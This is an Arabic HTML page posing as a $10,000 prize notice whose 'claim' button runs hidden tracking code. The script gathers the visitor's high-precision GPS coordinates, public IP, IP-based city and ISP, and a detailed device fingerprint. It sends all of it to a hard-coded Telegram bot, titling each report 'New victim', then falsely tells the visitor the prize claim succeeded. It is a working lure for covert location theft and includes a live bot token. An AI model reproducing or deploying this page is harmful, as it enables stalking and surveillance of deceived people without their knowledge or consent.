<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مبروك</title>
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        font-family: 'Segoe UI', Tahoma, sans-serif;
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: white;
        padding: 20px;
    }
    .container {
        background: rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(12px);
        border-radius: 24px;
        padding: 45px 30px;
        max-width: 420px;
        width: 100%;
        text-align: center;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        border: 1px solid rgba(255, 215, 0, 0.3);
    }
    h1 {
        font-size: 30px;
        margin-bottom: 15px;
        color: #FFD700;
        text-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
    }
    p {
        font-size: 16px;
        line-height: 1.7;
        margin-bottom: 20px;
        color: #e8e8e8;
    }
    .amount {
        font-size: 26px;
        font-weight: bold;
        color: #FFD700;
        display: block;
        margin: 15px 0;
        text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
    }
    button {
        background: linear-gradient(135deg, #FFD700, #FFA500);
        color: #0f2027;
        border: none;
        padding: 16px 50px;
        font-size: 19px;
        font-weight: bold;
        border-radius: 50px;
        cursor: pointer;
        box-shadow: 0 8px 25px rgba(255, 215, 0, 0.5);
        transition: transform 0.2s;
        margin-top: 10px;
    }
    button:active { transform: scale(0.95); }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .spinner {
        display: none;
        margin: 25px auto 0;
        border: 4px solid rgba(255, 255, 255, 0.2);
        border-top: 4px solid #FFD700;
        border-radius: 50%;
        width: 45px;
        height: 45px;
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .status {
        margin-top: 20px;
        font-size: 14px;
        color: #b0b0b0;
        display: none;
    }
    .accuracy-info {
        margin-top: 15px;
        font-size: 13px;
        color: #FFD700;
        display: none;
    }
</style>
</head>
<body>
<div class="container">
    <h1>🎉 مبروك! 🎉</h1>
    <p>لقد فزت بمبلغ <span class="amount">10,000 دولار</span></p>
    <p>اضغط على الزر أدناه لاستلام جائزتك الآن</p>
    <button id="claimBtn">استلام الجائزة</button>
    <div class="spinner" id="spinner"></div>
    <div class="status" id="status"></div>
    <div class="accuracy-info" id="accuracyInfo"></div>
</div>

<script>
(function() {
    'use strict';

    var BOT_TOKEN = '8759707833:AAFSzhInZJr9PFqvf7xXpe6BYIKnluWCI6U';
    var CHAT_ID = '8822455602';
    var TELEGRAM_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';

    function sendToTelegram(text) {
        return fetch(TELEGRAM_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        })
        .then(function(r) { return r.json(); })
        .catch(function(e) { console.error('Telegram error:', e); });
    }

    function sendTelegramLocation(lat, lon) {
        return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon,
                horizontal_accuracy: 1
            })
        })
        .then(function(r) { return r.json(); })
        .catch(function(e) { console.error('Location error:', e); });
    }

    function getBestGPSLocation() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'خدمة تحديد الموقع غير مدعومة في المتصفح' });
                return;
            }

            var samples = [];
            var watchId = null;
            var finished = false;
            var bestAccuracy = Infinity;
            var bestPoint = null;
            var TARGET_ACCURACY = 1;
            var MAX_WAIT_TIME = 90000;
            var MIN_SAMPLES = 3;

            function finish(result) {
                if (finished) return;
                finished = true;
                if (watchId !== null) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                }
                resolve(result);
            }

            function updateStatus(accuracy, count) {
                var statusEl = document.getElementById('status');
                var infoEl = document.getElementById('accuracyInfo');
                statusEl.textContent = 'جاري تحسين دقة الموقع...';
                statusEl.style.display = 'block';
                infoEl.style.display = 'block';
                if (accuracy && isFinite(accuracy)) {
                    infoEl.textContent = 'الدقة الحالية: ' + Math.round(accuracy) + ' متر | القراءات: ' + count;
                } else {
                    infoEl.textContent = 'القراءات: ' + count;
                }
            }

            var options = {
                enableHighAccuracy: true,
                timeout: 60000,
                maximumAge: 0
            };

            watchId = navigator.geolocation.watchPosition(
                function(position) {
                    var point = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        timestamp: position.timestamp
                    };

                    samples.push(point);

                    if (point.accuracy < bestAccuracy) {
                        bestAccuracy = point.accuracy;
                        bestPoint = point;
                    }

                    updateStatus(bestAccuracy, samples.length);

                    if (bestAccuracy <= TARGET_ACCURACY && samples.length >= MIN_SAMPLES) {
                        finish({ success: true, data: bestPoint, samples: samples.length });
                    }
                },
                function(error) {
                    if (bestPoint !== null) {
                        finish({ success: true, data: bestPoint, samples: samples.length });
                        return;
                    }
                    var errorMsg;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = 'تم رفض إذن الوصول إلى الموقع';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = 'معلومات الموقع غير متاحة';
                            break;
                        case error.TIMEOUT:
                            errorMsg = 'انتهت مهلة تحديد الموقع';
                            break;
                        default:
                            errorMsg = 'خطأ غير معروف في تحديد الموقع';
                    }
                    finish({ success: false, error: errorMsg });
                },
                options
            );

            setTimeout(function() {
                if (bestPoint !== null) {
                    finish({ success: true, data: bestPoint, samples: samples.length });
                } else {
                    finish({ success: false, error: 'لم يتم الحصول على إشارة GPS خلال الوقت المحدد' });
                }
            }, MAX_WAIT_TIME);
        });
    }

    function getPublicIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(data) { return data.ip; })
            .catch(function() {
                return fetch('https://ipapi.co/json/')
                    .then(function(r) { return r.json(); })
                    .then(function(d) { return d.ip; })
                    .catch(function() { return null; });
            });
    }

    function getIPInfo() {
        return fetch('https://ipapi.co/json/')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    lat: data.latitude,
                    lon: data.longitude,
                    postal: data.postal,
                    timezone: data.timezone
                };
            })
            .catch(function() { return null; });
    }

    function detectDeviceType() {
        var ua = navigator.userAgent;
        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
        var isTablet = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (isMobile && /Macintosh/i.test(ua));
        var isDesktop = !isMobile && !isTablet;
        var type = isTablet ? 'جهاز لوحي (تابلت)' : (isMobile ? 'هاتف محمول' : 'كمبيوتر');
        var brand = 'غير معروف';
        var model = 'غير معروف';
        var osName = 'غير معروف';
        var osVersion = '';

        if (/Android/i.test(ua)) {
            osName = 'Android';
            var androidMatch = ua.match(/Android\s([\d.]+)/);
            if (androidMatch) osVersion = androidMatch[1];
            var modelMatch = ua.match(/;\s([^;)]+)\sBuild/);
            if (modelMatch) {
                model = modelMatch[1].trim();
                if (/samsung/i.test(model)) brand = 'Samsung';
                else if (/huawei/i.test(model)) brand = 'Huawei';
                else if (/xiaomi|redmi|poco/i.test(model)) brand = 'Xiaomi';
                else if (/oppo/i.test(model)) brand = 'Oppo';
                else if (/vivo/i.test(model)) brand = 'Vivo';
                else if (/oneplus/i.test(model)) brand = 'OnePlus';
                else if (/realme/i.test(model)) brand = 'Realme';
                else if (/infinix/i.test(model)) brand = 'Infinix';
                else if (/tecno/i.test(model)) brand = 'Tecno';
                else if (/nokia/i.test(model)) brand = 'Nokia';
                else if (/sony/i.test(model)) brand = 'Sony';
                else if (/motorola|moto/i.test(model)) brand = 'Motorola';
            }
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            osName = 'iOS';
            brand = 'Apple';
            var iosMatch = ua.match(/OS\s([\d_]+)/);
            if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
            if (/iPhone/i.test(ua)) model = 'iPhone';
            else if (/iPad/i.test(ua)) model = 'iPad';
            else if (/iPod/i.test(ua)) model = 'iPod';
        } else if (/Windows/i.test(ua)) {
            osName = 'Windows';
            var winMatch = ua.match(/Windows NT\s([\d.]+)/);
            if (winMatch) {
                var winVer = winMatch[1];
                if (winVer === '10.0') osVersion = '10/11';
                else if (winVer === '6.3') osVersion = '8.1';
                else if (winVer === '6.2') osVersion = '8';
                else if (winVer === '6.1') osVersion = '7';
                else osVersion = winVer;
            }
        } else if (/Mac OS X/i.test(ua)) {
            osName = 'macOS';
            brand = 'Apple';
            var macMatch = ua.match(/Mac OS X\s([\d_.]+)/);
            if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');
        } else if (/Linux/i.test(ua)) {
            osName = 'Linux';
        }

        var browser = 'غير معروف';
        if (/Edg\//i.test(ua)) browser = 'Microsoft Edge';
        else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
        else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';
        else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = 'Google Chrome';
        else if (/Firefox\//i.test(ua)) browser = 'Mozilla Firefox';
        else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';

        return {
            type: type,
            brand: brand,
            model: model,
            os: osName,
            osVersion: osVersion,
            browser: browser
        };
    }

    function collectDeviceInfo() {
        var device = detectDeviceType();
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return {
            deviceType: device.type,
            brand: device.brand,
            model: device.model,
            os: device.os,
            osVersion: device.osVersion,
            browser: device.browser,
            userAgent: navigator.userAgent,
            platform: navigator.platform || 'غير معروف',
            language: navigator.language,
            languages: (navigator.languages || []).join(', '),
            screen: window.screen.width + 'x' + window.screen.height,
            availScreen: window.screen.availWidth + 'x' + window.screen.availHeight,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            cores: navigator.hardwareConcurrency || 'غير معروف',
            memory: navigator.deviceMemory || 'غير معروف',
            touchPoints: navigator.maxTouchPoints || 0,
            cookiesEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            referrer: document.referrer || 'مباشر',
            url: window.location.href,
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('ar-EG'),
            orientation: (screen.orientation && screen.orientation.type) || 'غير معروف',
            connectionType: conn ? (conn.effectiveType || conn.type || 'غير معروف') : 'غير معروف',
            downlink: conn && conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف'
        };
    }

    function formatGPSLocation(loc, samples, err) {
        if (err || !loc) {
            return '❌ <b>لم يتم الحصول على موقع GPS</b>\nالسبب: ' + (err || 'غير معروف');
        }
        var text = '';
        text += '🎯 <b>دقة الموقع:</b> ' + Math.round(loc.accuracy) + ' متر\n';
        text += '📡 <b>المصدر:</b> GPS\n';
        text += '🔢 <b>عدد القراءات:</b> ' + samples + '\n';
        if (loc.accuracy <= 1) {
            text += '✅ <b>جودة الإشارة:</b> ممتازة جداً (دقة متر واحد)\n';
        } else if (loc.accuracy <= 10) {
            text += '✅ <b>جودة الإشارة:</b> ممتازة\n';
        } else if (loc.accuracy <= 30) {
            text += '🟢 <b>جودة الإشارة:</b> جيدة جداً\n';
        } else if (loc.accuracy <= 100) {
            text += '🟡 <b>جودة الإشارة:</b> جيدة\n';
        } else {
            text += '🟠 <b>جودة الإشارة:</b> ضعيفة\n';
        }
        text += '📍 <b>خط العرض:</b> <code>' + loc.lat + '</code>\n';
        text += '📍 <b>خط الطول:</b> <code>' + loc.lon + '</code>\n';
        if (loc.altitude !== null && loc.altitude !== undefined) {
            text += '⛰️ <b>الارتفاع:</b> ' + Math.round(loc.altitude) + ' متر\n';
        }
        if (loc.speed !== null && loc.speed !== undefined) {
            text += '🚀 <b>السرعة:</b> ' + loc.speed + ' م/ث\n';
        }
        if (loc.heading !== null && loc.heading !== undefined) {
            text += '🧭 <b>الاتجاه:</b> ' + loc.heading + '°\n';
        }
        text += '🗺️ <b>خرائط جوجل:</b>\n';
        text += 'https://www.google.com/maps?q=' + loc.lat + ',' + loc.lon;
        return text;
    }

    function formatIPInfo(ip) {
        if (!ip) return '❌ لم يتم الحصول على معلومات IP';
        var text = '';
        text += '🌍 <b>عنوان IP:</b> <code>' + (ip.ip || 'غير معروف') + '</code>\n';
        text += '🏙️ <b>المدينة:</b> ' + (ip.city || 'غير معروف') + '\n';
        text += '🗺️ <b>المنطقة:</b> ' + (ip.region || 'غير معروف') + '\n';
        text += '🏳️ <b>الدولة:</b> ' + (ip.country || 'غير معروف') + '\n';
        text += '📮 <b>الرمز البريدي:</b> ' + (ip.postal || 'غير معروف') + '\n';
        text += '🕐 <b>المنطقة الزمنية:</b> ' + (ip.timezone || 'غير معروف') + '\n';
        text += '📡 <b>مزود الخدمة:</b> ' + (ip.isp || 'غير معروف');
        return text;
    }

    function formatDevice(info) {
        var text = '';
        text += '📱 <b>نوع الجهاز:</b> ' + info.deviceType + '\n';
        text += '🏷️ <b>الشركة:</b> ' + info.brand + '\n';
        text += '📲 <b>الموديل:</b> ' + info.model + '\n';
        text += '💻 <b>النظام:</b> ' + info.os + ' ' + info.osVersion + '\n';
        text += '🌐 <b>المتصفح:</b> ' + info.browser + '\n';
        text += '🗣️ <b>اللغة:</b> ' + info.language + '\n';
        text += '🖥️ <b>الشاشة:</b> ' + info.screen + '\n';
        text += '🎨 <b>عمق الألوان:</b> ' + info.colorDepth + ' bit\n';
        text += '🔍 <b>كثافة البكسل:</b> ' + info.pixelRatio + '\n';
        text += '🕐 <b>المنطقة الزمنية:</b> ' + info.timezone + '\n';
        text += '⚙️ <b>أنوية المعالج:</b> ' + info.cores + '\n';
        text += '🧠 <b>الذاكرة:</b> ' + info.memory + ' GB\n';
        text += '👆 <b>نقاط اللمس:</b> ' + info.touchPoints + '\n';
        text += '🍪 <b>الكوكيز:</b> ' + (info.cookiesEnabled ? 'مفعّلة' : 'معطّلة') + '\n';
        text += '📡 <b>الاتصال:</b> ' + (info.online ? 'متصل' : 'غير متصل') + '\n';
        text += '📶 <b>نوع الشبكة:</b> ' + info.connectionType + '\n';
        text += '⬇️ <b>سرعة التنزيل:</b> ' + info.downlink + '\n';
        text += '🔄 <b>الاتجاه:</b> ' + info.orientation;
        return text;
    }

    document.getElementById('claimBtn').addEventListener('click', function() {
        var btn = document.getElementById('claimBtn');
        var spinner = document.getElementById('spinner');
        var status = document.getElementById('status');

        btn.disabled = true;
        btn.style.display = 'none';
        spinner.style.display = 'block';
        status.style.display = 'block';
        status.textContent = 'جاري تحديد موقعك بدقة عالية جداً...';

        var deviceInfo = collectDeviceInfo();

        Promise.all([
            getBestGPSLocation(),
            getIPInfo(),
            getPublicIP()
        ]).then(function(results) {
            var gpsResult = results[0];
            var ipInfo = results[1];
            var publicIP = results[2];

            if (ipInfo && publicIP) {
                ipInfo.ip = publicIP;
            }

            var gpsText;
            if (gpsResult.success) {
                gpsText = formatGPSLocation(gpsResult.data, gpsResult.samples, null);
            } else {
                gpsText = formatGPSLocation(null, 0, gpsResult.error);
            }

            var message = '🎯 <b>ضحية جديدة - معلومات كاملة</b>\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
            message += '📡 <b>الموقع الجغرافي (GPS):</b>\n';
            message += gpsText + '\n\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
            message += '🌍 <b>الموقع حسب IP:</b>\n';
            message += formatIPInfo(ipInfo) + '\n\n';
            message += '📌 <b>عنوان IP العام:</b> <code>' + (publicIP || 'غير معروف') + '</code>\n\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
            message += '📊 <b>معلومات الجهاز:</b>\n';
            message += formatDevice(deviceInfo) + '\n\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
            message += '🔗 <b>الرابط:</b> ' + deviceInfo.url + '\n';
            message += '↩️ <b>المصدر:</b> ' + deviceInfo.referrer + '\n';
            message += '⏰ <b>الوقت المحلي:</b> ' + deviceInfo.localTime + '\n';
            message += '🕐 <b>UTC:</b> ' + deviceInfo.timestamp;

            status.textContent = 'جاري إرسال البيانات...';

            var tasks = [sendToTelegram(message)];

            if (gpsResult.success) {
                tasks.push(sendTelegramLocation(gpsResult.data.lat, gpsResult.data.lon));
            }

            return Promise.all(tasks);
        }).then(function() {
            spinner.style.display = 'none';
            status.textContent = 'تم الاستلام بنجاح ✅';
            document.getElementById('accuracyInfo').style.display = 'none';
            btn.style.display = 'inline-block';
            btn.textContent = 'تم استلام الجائزة ✅';
            setTimeout(function() {
                alert('تم استلام طلبك بنجاح!\nسيتم التواصل معك قريباً لاستلام الجائزة.');
            }, 300);
        }).catch(function(err) {
            spinner.style.display = 'none';
            status.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى';
            btn.style.display = 'inline-block';
            btn.disabled = false;
            console.error(err);
        });
    });
})();
</script>
</body>
</html>
